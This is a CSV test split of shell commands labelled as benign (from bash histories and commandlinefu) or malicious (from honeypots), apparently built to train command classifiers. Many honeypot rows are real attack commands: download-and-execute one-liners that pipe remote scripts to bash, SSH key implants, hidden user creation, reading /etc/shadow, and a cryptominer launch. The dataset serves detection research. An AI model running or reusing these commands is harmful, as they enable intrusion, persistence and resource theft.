id,command,label,source,split
d2_006814,parolA123klop,1,honeypot,test
d2_006818,chmod 777 VIP,1,honeypot,test
d2_006832,vim root,0,bash_history,test
d2_006843,rm *(L0),0,commandlinefu,test
d2_006844,man dhclient,0,bash_history,test
d2_006851,sudo pacman -R blender,0,bash_history,test
d2_006866,nmap -Pn -p 9212 ittest.geonetric.com,0,bash_history,test
d2_006870,sudo edquota -u air3,0,bash_history,test
d2_006875,sudo apt-get update cmake,0,bash_history,test
d2_006880,"curl -s http://h8e465e73.example.net/commands/by/$1/xml | awk -F'</?div[^>]*>' '/class=\""command\""/{gsub(/""/,""\"""",$2); gsub(/</,""<"",$2); gsub(/>/,"">"",$2); gsub(/&/,""\\&"",$2); cmd=$2} /class=\""num-votes\""/{printf(""%3i %s\n"", $2, cmd)}'",0,commandlinefu,test
d2_006882,git add catalog/view/theme/default/template/extension/module/recently_viewed.twig,0,bash_history,test
d2_006893,./exel,0,bash_history,test
d2_006895,sudo discord,1,honeypot,test
d2_006899,video4,0,bash_history,test
d2_006900,java Con clear,0,bash_history,test
d2_006901,rm loligang.m68k -rf,1,honeypot,test
d2_006903,LC_ALL=C chmod 700 ~/.ssh,1,honeypot,test
d2_006906,sudo ip neigh flush,0,bash_history,test
d2_006907,ls *.zone,0,bash_history,test
d2_006909,netstat -lantp | grep -i establ | awk -F/ '{print $2}' | sort | uniq,0,commandlinefu,test
d2_006911,"declare -a array=($(tail -n +2 /proc/net/tcp | cut -d"":"" -f""3""|cut -d"" "" -f""1"")) && for port in ${array[@]}; do echo $((0x$port)); done",0,commandlinefu,test
d2_006917,rsync -avR vu test/vu,0,bash_history,test
d2_006919,"for name in *.mp3; do ffmpeg -loop 1 -i imagename.jpg -i ""$name"" -shortest -c:v libx264 -preset ultrafast -c:a copy ""${name%.*}.mp4""; done",0,commandlinefu,test
d2_006921,nbgrader fetch --course data301 ps8,0,bash_history,test
d2_006925,:set ic,0,commandlinefu,test
d2_006937,"ord() { printf ""%d\n"" ""'$1""; }",0,commandlinefu,test
d2_006942,git branch -m upgrade-17.04.0-ce,0,bash_history,test
d2_006943,kill -0 $(cat /var/tmp/.system9S5D22fourmgF21) 2>&1,1,honeypot,test
d2_006951,"for NETBLOCK in $(echo _netblocks.google.com _netblocks2.google.com _netblocks3.google.com); do nslookup -q=TXT $NETBLOCK ; done | tr "" "" ""\n"" | grep ^ip[46]: | cut -d: -f2- | sort",0,commandlinefu,test
d2_006954,git --help,0,bash_history,test
d2_006956,ls -ltr /isiseqruns/RonAxoTrinity/AxoMikeTest/STDOUT/full_assembly/tissue_types/Dist_Zeugo/,0,bash_history,test
d2_006960,cat .bash_history |grep tbd,0,bash_history,test
d2_006964,systemctl list-dependencies vmware-workstation-server.service --reverse,0,bash_history,test
d2_006966,"export IFS=$(echo -e ""\n"")",0,commandlinefu,test
d2_006975,roscd robosub,0,bash_history,test
d2_006976,tar -xzvf pss,1,honeypot,test
d2_006977,"cat /var/log/secure.log | awk '{print substr($0,0,12)}' | uniq -c | sort -nr | awk '{printf(""\n%s "",$0) ; for (i = 0; i<$1 ; i++) {printf(""*"")};}'",0,commandlinefu,test
d2_006982,"genRandomText() { tr -cd '[:alpha:]' < /dev/urandom | head -c ""$1""; }",0,commandlinefu,test
d2_006992,python -m http.server,0,commandlinefu,test
d2_007005,ssh data003.ref05.conso.qualif.gen01.ke.p.fti.net sudo route add default gw 207.238.135.162 vlan1321,0,bash_history,test
d2_007011,PF=onyx STACK_NAME=divisu mdk ps curator,0,bash_history,test
d2_007014,vim ./offboard/perception/training/evaluation/test/track_evaluator_test.cpp,0,bash_history,test
d2_007027,curl inet-ip.info,0,commandlinefu,test
d2_007034,"DIR=. ; FSTYPE=$(df -TP ${DIR} | grep -v Type | awk '{ print $2 }') ; echo ""${FSTYPE}""",0,commandlinefu,test
d2_007036,mv css js static,0,bash_history,test
d2_007040,man git-remote,0,bash_history,test
d2_007043,"lsblk | grep -v part | awk '{print $1 ""\t"" $4}'",0,commandlinefu,test
d2_007055,git clonescrooloose/nerdtree.git ~/.vim/bundle/nerdtree,0,bash_history,test
d2_007056,xrandr --dpi,0,bash_history,test
d2_007060,gcc catbythien.c -o ercat,0,bash_history,test
d2_007065,git stauts,0,bash_history,test
d2_007067,doocker ps,0,bash_history,test
d2_007074,sudo apt install vim*,0,bash_history,test
d2_007077,wget nuz.do.am/psybnc.tar.gz,1,honeypot,test
d2_007090,/dev/null 2&gt,1,honeypot,test
d2_007102,fuser -v 80/tcp,0,commandlinefu,test
d2_007104,ls demo_repo/,0,bash_history,test
d2_007114,-h,0,bash_history,test
d2_007117,less mdmsetup.glade,0,bash_history,test
d2_007121,tar xvfz git-1.8.2.tar.gz,0,bash_history,test
d2_007123,linuxer,1,honeypot,test
d2_007133,bower install bootstrap@4.0.0-alpha.6,0,bash_history,test
d2_007149,0xc0031897: inode_allow_write (...../../filesys/inode.c:337),0,bash_history,test
d2_007151,chmod 777 zyxnlbins.sh,1,honeypot,test
d2_007159,ls -ltr /isitools/CentOS-5/R-2.15.2/share/man/`,0,bash_history,test
d2_007164,wget 89.115.197.73/bash.tgz,1,honeypot,test
d2_007165,sudo tar -czvf testlink-1.9.17.tar,0,bash_history,test
d2_007169,echo 'admin' | sudo -S useradd -M -p 12Un9CBdZ.JRc -s /bin/true x4_n1Z,1,honeypot,test
d2_007179,ssh username@remotehost 'mysqldump -u <dbusername> -p<dbpassword> <dbname> tbl_name_1 tbl_name_2 tbl_name_3' | mysql -u <localusername> -p<localdbpassword> <localdbname> < /dev/stdin,0,commandlinefu,test
d2_007181,git checkout -,0,bash_history,test
d2_007188,"bind -x '""\C-p""':pwd",0,commandlinefu,test
d2_007189,cat /proc/cpuinfo | grep name | wc -l,1,honeypot,test
d2_007200,tar -cf - /home/user/test | gzip -c | ssh user@sshServer 'cd /tmp; tar xfz -',0,commandlinefu,test
d2_007206,"function brainwallet_exponent () { printf %s ""$1""|sha256sum|head -c 64; }",0,commandlinefu,test
d2_007212,seq 1 10 -s,0,bash_history,test
d2_007214,service jenkins start,0,bash_history,test
d2_007215,la storage/2/,0,bash_history,test
d2_007216,wget http://h1a75f38b.example.net/read.txt -q,1,honeypot,test
d2_007230,LC_ALL=C $SHELL /var/tmp/r,1,honeypot,test
d2_007232,clean,0,bash_history,test
d2_007237,find . -name teste,0,bash_history,test
d2_007246,curl -I <IPaddress>,0,commandlinefu,test
d2_007248,"sudo apt-get update 2> /tmp/keymissing; for key in $(grep ""NO_PUBKEY"" /tmp/keymissing |sed ""s/.*NO_PUBKEY //""); do echo -e ""\nProcessing key: $key""; gpg --keyserver pool.sks-keyservers.net --recv $key && gpg --export --armor $key |sudo apt-key add -; done",0,commandlinefu,test
d2_007249,cp trunk/db/development.sqlite3 graphs/db/,0,bash_history,test
d2_007250,emacs -nw,0,bash_history,test
d2_007258,curl http://he9b6be8e.example.net/XnmQ8,1,honeypot,test
d2_007260,ls -ld .wine/,0,bash_history,test
d2_007265,"alias t=""tee >(pbcopy)""",0,commandlinefu,test
d2_007272,wget --recursive --page-requisites --convert-links www.moyagraphix.co.za,0,commandlinefu,test
d2_007278,mv firewall Documents/fwrules,0,bash_history,test
d2_007287,"(sleep 1;echo EHLO MAIL;sleep 1;echo ""MAIL FROM: <a@foo.de>"";sleep 1;echo ""RCPT TO: <b@bar.eu>"";sleep 1;echo DATA;sleep 1;echo Subject: test;sleep 1;echo;sleep 1;echo Message;sleep 1;echo .;sleep 1;)|openssl s_client -host b.de -port 25 -starttls smtp",0,commandlinefu,test
d2_007315,pkill thunar,0,bash_history,test
d2_007317,rm .ug*,1,honeypot,test
d2_007319,"enscript -L1 -b'||Page $% of $=' -o- < <(for i in $(seq ""$(pdftk ""$1"" dump_data | grep ""Num"" | cut -d"":"" -f2)""); do echo; done) | ps2pdf - | pdftk ""$1"" multistamp - output ""${1%.pdf}-header.pdf""",0,commandlinefu,test
d2_007321,dmidecode -s system-manufacturer,1,honeypot,test
d2_007329,php composer.phar create-project neos/neos-base-distribution NeosDemo,0,bash_history,test
d2_007330,dd if=/dev/zero | pv | dd of=/dev/null,0,commandlinefu,test
d2_007337,"gnuplot -p <(echo ""set style data hist; set xtic rot by -45; plot '<(stat -c \""%n %s\"" *)' u 2:xtic(1)"")",0,commandlinefu,test
d2_007339,/System/Library/Frameworks/ScreenSaver.framework/Resources/ScreenSaverEngine.app/Contents/MacOS/ScreenSaverEngine -background &,0,commandlinefu,test
d2_007345,wget http://hb0dad9e2.example.net/SnOoPy.sh,1,honeypot,test
d2_007349,./I9a27YsP,1,honeypot,test
d2_007355,paste <(pacman -Q | awk '{ print $1; }' | xargs pacman -Qi | grep 'Size' | awk '{ print $4$5; }') <(pacman -Q | awk '{print $1; }') | sort -n | column -t,0,commandlinefu,test
d2_007372,git clonestoread/stepik-android.git,0,bash_history,test
d2_007379,cat app/Setting.php,0,bash_history,test
d2_007382,apt-get install mercurial,0,bash_history,test
d2_007387,sudo ovs-vswitchd --help,0,bash_history,test
d2_007391,vi lab03.txt,0,bash_history,test
d2_007394,"curl -s https://h01892413.example.net/users/<username>/repos?per_page=1000 | grep -oP '(?<=""git_url"": "").*(?=""\,)'",0,commandlinefu,test
d2_007397,tftp -r kuma-ssh-update2.sh -g 204.113.152.244,1,honeypot,test
d2_007401,unrar p -inul foo.rar|mplayer -,0,commandlinefu,test
d2_007411,rm ddd,0,bash_history,test
d2_007413,sudo apt-get install php5 libapache2-mod-php5 php5-mysql,0,bash_history,test
d2_007422,mussh -h host1 host2 host3 -c uptime,0,commandlinefu,test
d2_007424,/bin/busybox cat //.nippon,1,honeypot,test
d2_007426,"echo ""alias nfetch=""nbgrader fetch --course data301"""">>.bashrc",0,bash_history,test
d2_007432,yaourt calculator,0,bash_history,test
d2_007434,sh njs.sh,1,honeypot,test
d2_007435,./gox,1,honeypot,test
d2_007442,sh ssh2.sh,1,honeypot,test
d2_007445,wget http://h8df6b9fa.example.net/Cipher.sh,1,honeypot,test
d2_007446,unzip iosevka-ss01-2.2.1.zip,0,bash_history,test
d2_007450,./sdf3fslsdf15,1,honeypot,test
d2_007452,gcc s4.sh,0,bash_history,test
d2_007457,file sqlservr,0,bash_history,test
d2_007459,perl clone.txt ips.txt 61.213.84.153 6667 xteam/122 #ranakah zblojencek,0,bash_history,test
d2_007470,gprof gmon.out,0,bash_history,test
d2_007471,tftp -r loligang.ppc -g 100.118.77.54,1,honeypot,test
d2_007486,get -q -O - http://h7642432e.example.net/2start.jpg | bash -sh,1,honeypot,test
d2_007487,ls -ltr fastQC_OUT/,0,bash_history,test
d2_007488,cleaar,0,bash_history,test
d2_007497,bus fd kmsg loop7 network_latency rtc stderr tty14 tty23 tty32 tty41 tty50 tty6 ttyS2 vboxusb vcsa1 vhost-net,0,bash_history,test
d2_007498,curl http://he49d0953.example.net/,0,commandlinefu,test
d2_007499,rm -r *.CHongqing.Hot.Pot*,0,bash_history,test
d2_007504,wmctrl -m | grep Name: | awk '{print $2}',0,commandlinefu,test
d2_007506,apt-get install nano,0,bash_history,test
d2_007507,su -nagios,0,bash_history,test
d2_007510,cat send10.py,0,bash_history,test
d2_007511,wget https://hcbde1f0b.example.net/13nUZl/adr.pl,1,honeypot,test
d2_007513,aptitude remove $(dpkg -l|egrep '^ii linux-(im|he)'|awk '{print $2}'|grep -v `uname -r`),0,commandlinefu,test
d2_007518,PATH=$PATH:/home/hcc/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games,0,bash_history,test
d2_007543,rm SALTScache.db,0,bash_history,test
d2_007544,sh httpdlogic.sh,1,honeypot,test
d2_007549,wget -q -O- PAGE_URL | grep -o 'WORD_OR_STRING' | wc -w,0,commandlinefu,test
d2_007550,wget --version,0,bash_history,test
d2_007554,find . -type f -name *.ext -exec cat {} > file.txt \;,0,commandlinefu,test
d2_007556,./VksynVct,1,honeypot,test
d2_007561,python btle.py 1E:D9:3E:C9:07:17,0,bash_history,test
d2_007568,tftp 127.173.194.220 -c get tssh.sh,1,honeypot,test
d2_007569,./config.status,0,bash_history,test
d2_007570,ls `echo $PATH | sed 's/:/ /g'`,0,commandlinefu,test
d2_007572,sudo tcpdump -nn -v port ftp or ftp-data,0,commandlinefu,test
d2_007576,"arr[i*100+j]=""whatever""",0,commandlinefu,test
d2_007579,docker rmi $(docker images -a -q),0,bash_history,test
d2_007580,;p\,0,bash_history,test
d2_007583,wget NasaPaul.com/ninfo,1,honeypot,test
d2_007585,=() { echo $(($*)); },0,commandlinefu,test
d2_007595,vim-addon-manager status,0,bash_history,test
d2_007598,echo -n $_HOSTS | parallel -j 5 rsync -arve --stats --progress --human-readable {} ~/tomcat8-2.4-release.tar root@HOST:/tmp,0,bash_history,test
d2_007603,tar xvzf bashstuff.tar.gz,0,bash_history,test
d2_007606,cd !$:h,0,commandlinefu,test
d2_007608,for d in `find .. -mindepth 1 -maxdepth 1 -type d | sort`; do if [[ `basename $d` > `basename $PWD` ]]; then cd $d; break; fi; done,0,commandlinefu,test
d2_007609,scp -r -P22 ./freedroidrpg-0.13 jwmlt1:/Desktop,0,bash_history,test
d2_007614,elasticdump --help,0,bash_history,test
d2_007616,ruby -rrubygems/commands/mirror_command -S gem mirror,0,commandlinefu,test
d2_007625,for name in larry moe schemp; do useradd $name; echo 'password' | passwd --stdin $name; chage -d 0 $name; done,0,commandlinefu,test
d2_007635,texcount -h,0,bash_history,test
d2_007638,tail -f access_log | cut -c2-21 | uniq -c,0,commandlinefu,test
d2_007643,chomd 77 sdb1,0,bash_history,test
d2_007659,LC_ALL=C passwd oracle,1,honeypot,test
d2_007669,rm features/author.feature,0,bash_history,test
d2_007679,vi attributes/default.rb,0,bash_history,test
d2_007682,"oc new-project abi-jenkins --display-name ""Shared Jenkins""",0,bash_history,test
d2_007684,bzr info,0,bash_history,test
d2_007690,sudo pacman -Ss lxrandr,0,bash_history,test
d2_007691,hdparm -i[I] /dev/sda,0,commandlinefu,test
d2_007707,sudo vi /etc/samba/smb.conf,0,bash_history,test
d2_007709,./cnrig -o 68.198.238.17:5555 -u (44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A) -p nume(paul)+email(miner@nasapaul.com),1,honeypot,test
d2_007715,wgets.apache.org/dist/tomcat/tomcat-9/v9.0.14/bin/apache-tomcat-9.0.14.tar.gz,0,bash_history,test
d2_007722,sudo pacman -Qqn | pacman -S -,0,bash_history,test
d2_007724,git add -u,0,bash_history,test
d2_007725,ftpget -v -u anonymous -p anonymous -P 21 143.87.86.231 ftp1.sh ftp1.sh,1,honeypot,test
d2_007734,cat networking,0,bash_history,test
d2_007745,sudo -u postgres psql,0,bash_history,test
d2_007747,wget https://h8fe31bb0.example.net/BVr8/boty.pl,1,honeypot,test
d2_007748,javac Test2.java,0,bash_history,test
d2_007749,which command,0,commandlinefu,test
d2_007756,./libc.so.6,1,honeypot,test
d2_007757,pwgen -Bnyc,0,commandlinefu,test
d2_007760,./N0PADmxf,1,honeypot,test
d2_007766,./cordic-fpga,0,bash_history,test
d2_007771,chmod 777 BillyCyrusbins.sh,1,honeypot,test
d2_007772,als -a,1,honeypot,test
d2_007773,sh Razor.sh,1,honeypot,test
d2_007780,tftp -g 181.150.202.127 -r tftp1.sh,1,honeypot,test
d2_007784,git clones/conky/releases/latest,0,bash_history,test
d2_007785,tar -xzvf mysql-5.1.73-osx10.6-x86_64,0,bash_history,test
d2_007788,COsmin12213,1,honeypot,test
d2_007789,"echo '{""json"":""obj""}' | python -mjson.tool",0,commandlinefu,test
d2_007790,""""""" ; if url[0] == ':': ; schemed_url = '%s%s' % (scheme, url) ; else: ; schemed_url = url ; headers['User-Agent'] = user_agent ; return Request(schemed_url, data=data, headers=headers) ; def catch_request(request): ; """"""Helper function to catch common exceptions encountered when",1,honeypot,test
d2_007793,which blast,0,bash_history,test
d2_007798,./sample.py,0,bash_history,test
d2_007799,trizen -R acestream-player acestream-player-data acestream-engine,0,bash_history,test
d2_007800,host logstash-divisu-reca.metriks.hbx.geo.francetelecom.fr,0,bash_history,test
d2_007813,"a=$(b=$(($LINES/2));f() { for c in $(seq $b); do for i in $(seq $c);do echo x;done|xargs echo;done };paste <(f) <(f|tac|tr 'x' '-') <(f|tac|tr 'x' '-') <(f)|tr '\t' ' ');(cat <<<""$a""|tac;cat <<<""$a"")|tr '-' ' '",0,commandlinefu,test
d2_007814,/bin/busybox echo -e '\x47\x72\x6f\x70/sys/fs/cgroup/cpuset' > /sys/fs/cgroup/cpuset/.nippon,1,honeypot,test
d2_007818,[goalador@gatanda hhneuauf.de]$ [goalador@gatanda hhneuauf.de]$ [goalador@gatanda hhneuauf.de]$ alador@gatanda: command not found,0,bash_history,test
d2_007820,/bin/busybox echo -e '\x47\x72\x6f\x70/proc/fs' > /proc/fs/.nippon,1,honeypot,test
d2_007821,apt install expat,0,bash_history,test
d2_007824,Lesson 41: Logon to Ubuntu via SSH Without Passwords,0,bash_history,test
d2_007826,mysql --user = root --password = S1l4r2016$ silar_db < /home/group/silardump.sql,0,bash_history,test
d2_007838,ls /var/www/html/,0,bash_history,test
d2_007839,bin/kafka-console-consumer.sh --bootstrap-server 13.249.1.24:9092 --topic test --from-beginning,0,bash_history,test
d2_007840,bc <<< `uptime | sed -e 's/^.*up //' -e 's/[^0-9:].*//' | sed 's/:/*60+/g'`,0,commandlinefu,test
d2_007843,echo date '+%a',0,bash_history,test
d2_007849,cp -a /opt/R-2.15.2_WORKING ./R-2.15.2,0,bash_history,test
d2_007851,rm scrobble.py~,0,bash_history,test
d2_007855,"/bin/busybox cat /sys/fs/cgroup/net_cls,net_prio/.nippon",1,honeypot,test
d2_007857,name: mongo-data,0,bash_history,test
d2_007859,ssh user@host 'gunzip - > file' < file.gz,0,commandlinefu,test
d2_007862,mkdir ...,0,bash_history,test
d2_007863,ls -ltr ../../elbow/,0,bash_history,test
d2_007870,vim app/controllers/contact_controller.rb,0,bash_history,test
d2_007874,cp ~/Pictures/wallpaper.jpg .,0,bash_history,test
d2_007878,ps aux | sort -n -k2 | awk '{if ($2 < 300) print($0)}',0,commandlinefu,test
d2_007879,lwp-download http://hc7a2b958.example.net/ssh1.txt,1,honeypot,test
d2_007881,"dpkg --status nvidia-current | grep Version | cut -f 1 -d '-' | sed 's/[^.,0-9]//g'",0,commandlinefu,test
d2_007883,chmod +x do3309,1,honeypot,test
d2_007884,gustav0b@lo:~/bin$ n1=9,0,bash_history,test
d2_007891,cat new1.txt,0,bash_history,test
d2_007901,wget http://h9ac73aee.example.net/Nlebi/bot.pl,1,honeypot,test
d2_007908,nano ~/.zshrc,0,bash_history,test
d2_007909,[goalador@gatanda hhneuauf.de]$ [goalador@gatanda hhneuauf.de]$ bash: f.de]$: command not found,0,bash_history,test
d2_007910,sudo vim /etc/default/apport,0,bash_history,test
d2_007912,less eventcmd-examples/multi.sh,0,bash_history,test
d2_007913,mkdir /etc/systemd//system/getty@tty1.service.d/,0,bash_history,test
d2_007914,vi add_num.sh,0,bash_history,test
d2_007917,mkdir sugi,1,honeypot,test
d2_007918,awk '!x[$0]++' <file>,0,commandlinefu,test
d2_007919,man sshd,0,bash_history,test
d2_007922,wget http://hfb251cdd.example.net/httpdlogic.sh,1,honeypot,test
d2_007926,mkdir java,0,bash_history,test
d2_007930,"au BufWritePost * if getline(1) =~ ""^#!"" | if getline(1) =~ ""/bin/"" | silent !chmod +x <afile> | endif | endif",0,commandlinefu,test
d2_007933,./ptUehrfk,1,honeypot,test
d2_007934,"alias z='zenity --info --text=""You will not believe it, but your command has finished now! :-)"" --display :0.0'",0,commandlinefu,test
d2_007936,sudo nano /etc/lora-app-server/lora-app-server.toml,0,bash_history,test
d2_007941,nohup make -j 24 &,0,bash_history,test
d2_007946,find -name nginx.vim,0,bash_history,test
d2_007952,>/var/.hbot,1,honeypot,test
d2_007953,git checkout assn1.c,0,bash_history,test
d2_007969,mv comcast.txt Documents/,0,bash_history,test
d2_007995,find . -type f -perm +200 -print,0,commandlinefu,test
d2_008009,chmo +x trab1,0,bash_history,test
d2_008011,diff <(sort <(md5deep -b -r /directory/1/) ) <(sort <(md5deep -b -r /directory/2/),0,commandlinefu,test
d2_008030,SSH: command not found,0,bash_history,test
d2_008031,sudo mkdir iotmp,0,bash_history,test
d2_008032,./hoho bash mariadb,0,bash_history,test
d2_008039,./xampp-linux-x64-5.6.24-1-installer.run,0,bash_history,test
d2_008040,cd .cache,1,honeypot,test
d2_008062,"got commit -m ""1""",0,bash_history,test
d2_008064,mplayer 00_3_1_notPerfect_and_unsplash.com.m,0,bash_history,test
d2_008065,echo 'b'zeroshell'' | sudo -S cat /etc/shadow,1,honeypot,test
d2_008072,ln -s ~/hackinscience/.bashrc ~/.bashrc,0,bash_history,test
d2_008076,vim rubik.c,0,bash_history,test
d2_008084,sudo apt get install cmake g++ g++ multilib mercurial make python,0,bash_history,test
d2_008089,chmod +x curl.sh,1,honeypot,test
d2_008095,"if [ ! -z ""${DISPLAY}"" ]; then someXcmd ; fi",0,commandlinefu,test
d2_008102,echo 'cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && rm *.sh ; wget http://hff576526.example.net/bin.sh || curl http://hff576526.example.net/curl.sh -o curl.sh || chmod +x *.sh ; ./bin.sh ; ./curl.sh' | sh,1,honeypot,test
d2_008104,rm -RF .,0,bash_history,test
d2_008106,vi rçelacao,0,bash_history,test
d2_008115,curl -fsSL http://h7642432e.example.net/2start.jpg | bash -sh,1,honeypot,test
d2_008123,ls ../../,0,bash_history,test
d2_008128,ls trinity/mir-36/,0,bash_history,test
d2_008133,cat .maestro_2016-2,0,bash_history,test
d2_008135,git,0,bash_history,test
d2_008138,/bin/busybox cat /sys/fs/cgroup/rdma/.nippon,1,honeypot,test
d2_008142,apt-get install npm,0,bash_history,test
d2_008147,vi etc/apt/sources.list,0,bash_history,test
d2_008153,tftp -g 14.104.206.77 -r tftp1.sh,1,honeypot,test
d2_008154,"lsblk -o NAME,TYPE,FSTYPE,LABEL,SIZE,MODEL,MOUNTPOINT",0,commandlinefu,test
d2_008160,cat /home/helenluciany/,0,bash_history,test
d2_008187,sudo chmod my.cnf 744,0,bash_history,test
d2_008194,find . \( -type d -name .svn -prune \) -o -type d -print,0,commandlinefu,test
d2_008195,pacman -S ttf-monaco,0,bash_history,test
d2_008199,"echo ""admin"" | sudo -S sh -c ""sed '#/lib/libxml.so#d' /etc/ld.so.preload > /etc/ld.so.preload""",1,honeypot,test
d2_008205,rm -rf hash-x3.tgz,1,honeypot,test
d2_008217,bzr push --port 443 sftp://haa80fd33.example.net/~williams.jayson/bashpref,0,bash_history,test
d2_008218,tftp 14.104.206.77 -c get tftp2.sh,1,honeypot,test
d2_008227,cat /bin/ls | more,1,honeypot,test
d2_008232,cp ../variables.tf .,0,bash_history,test
d2_008233,man xdg-user-dirsupdate,0,bash_history,test
d2_008237,"for y in {1..10}; do for x in {1..10}; do echo -n ""| $x*$y=$((y*x)) ""; done; echo; done|column -t",0,commandlinefu,test
d2_008241,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9 ; }'",1,honeypot,test
d2_008246,yes '' | cat -n,0,commandlinefu,test
d2_008249,git fetch,0,bash_history,test
d2_008250,./configure --sysconfdir=/etc --with-group-name-max-length=32,0,bash_history,test
d2_008261,mv elbow/ Elbow,0,bash_history,test
d2_008264,perl v.py,1,honeypot,test
d2_008268,wgets.lycos.co.uk/b3ngos/flood.mp3,0,bash_history,test
d2_008273,open app-ios/LocalizedStringKit/tr.lproj/LocalizedStringKit.strings,0,bash_history,test
d2_008278,apt install autotools,0,bash_history,test
d2_008286,"die(){ result=$1;shift;[ -n ""$*"" ]&&printf ""%s\n"" ""$*"" >&2;exit $result;}",0,commandlinefu,test
d2_008288,sudo useradd -M -p 12kbbI9z.40yc -s /bin/true x4_n1v,1,honeypot,test
d2_008299,wget --spider -v http://h069fecc3.example.net/path/file.ext,0,commandlinefu,test
d2_008304,nano /etc/resolv.conf,1,honeypot,test
d2_008311,whereis npm,0,bash_history,test
d2_008313,cat /home/helenluciany/case4 > caso4,0,bash_history,test
d2_008324,echo 'ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAvN5GkpS25Z9eA2bARaXTVfVN2m/N5V5ddOTyVPftA3ljorQitmh1pyuZDty9oTWF+J0cOtGBvRaQ7NvZCaDC2q6QR0iMOfq7zs+4bl8WO8UnaQcVVIBeEt3YPo8PXwVm5fR4wgoq9SZp29/2jFz0UmAOhiUyImh9/P7jFWqpv3gSxZ8neq+4pSCUfE24OGiFBpJGkAE+wMmJcBX0WjFfjedcbBs1FO/C+x8WY9bFkQ3NwwjVbh3c3mYy9zqdPhm6GI/heVAZUWSKHausOwb+Rem+eKhkrKvoeteqJXEIrlLbHyRHn+12nN/qgG5kIcICv4TRD59GHMYZH3ILngyFJQ==' >> .ssh/authorized_keys,1,honeypot,test
d2_008331,node stream-server.js,0,bash_history,test
d2_008333,vi myls.sh,0,bash_history,test
d2_008334,ssh-copy-id localhost.localdomain,0,bash_history,test
d2_008341,./eG91wiGc,1,honeypot,test
d2_008346,chmod +x ssqzYHpG,1,honeypot,test
d2_008353,find . -type f -exec grep -i <pattern> \;,0,commandlinefu,test
d2_008354,cat fastQC_OUT/nohup.out,0,bash_history,test
d2_008360,bash -c ./XLaTXqVT,1,honeypot,test
d2_008367,"az acount set --subscription=""aa4258da-1f5a-4595-8ffd-6588461d65b8""",0,bash_history,test
d2_008370,vim time.futebol,0,bash_history,test
d2_008371,git stage,0,bash_history,test
d2_008381,rofi -theme config,0,bash_history,test
d2_008382,sudo find /usr/local/bin -name '*.sh' -delete,0,bash_history,test
d2_008383,"echo ""admin"" | rm -R /var/libxml_CP",1,honeypot,test
d2_008385,"{ if (/^[A-Za-z0-9]/) { interface=$1; next } else { if (/inet [Aa][d]*r/) { split($2,ip,"":"") } else { next } } print interface""\t: ""ip[2] }",0,commandlinefu,test
d2_008387,chmod +x bMtNqIsh,1,honeypot,test
d2_008389,head axo_left.fa,0,bash_history,test
d2_008391,git diff -- app,0,bash_history,test
d2_008395,"wget --mirror --random-wait --recursive robots=off -U mozilla -R gif,jpg,pdf --reject-regex '((.*)\?(.*))|(.*)' -c [URLGOESHERE]",0,commandlinefu,test
d2_008400,nohup ./zyk >>/dev/null &,1,honeypot,test
d2_008404,git remote set-url origin git@gitlab.si.francetelecom.fr:melvis/docker-images/cerebro.git,0,bash_history,test
d2_008407,host google.com,0,commandlinefu,test
d2_008410,/bin/busybox cat /proc/fs/.nippon,1,honeypot,test
d2_008413,rm loligang.arm -rf,1,honeypot,test
d2_008414,"desiredDay=6; year=2012; month=5; n=0; while [ $(date -d ""$year-$((month+1))-1 - $n day"" ""+%u"") -ne $desiredDay ]; do n=$((n+1)); done; date -d ""$year-$((month+1))-1 - $n day"" ""+%x""",0,commandlinefu,test
d2_008416,"echo ""Subject: test"" | /usr/lib/sendmail -v me@domain.com",0,commandlinefu,test
d2_008422,make -C gnulib-lib,0,bash_history,test
d2_008425,curl -O http://h08a1945d.example.net/ssh.sh,1,honeypot,test
d2_008426,./f root.x86_64,1,honeypot,test
d2_008429,lastt,1,honeypot,test
d2_008430,sudo chgrp mir /runs/130524_SN1057_0126_BD1EWUACXX,0,bash_history,test
d2_008440,wget https://h8fe31bb0.example.net/rWDk/config.json,1,honeypot,test
d2_008447,psu(){ command ps -Hcl -F S f -u ${1:-$USER}; },0,commandlinefu,test
d2_008459,busybox wget http://h0e6255f0.example.net/Pemex.sh,1,honeypot,test
d2_008463,"ls D{123,uo,own}loads",0,bash_history,test
d2_008466,sudo apt-get install i3-wm,0,bash_history,test
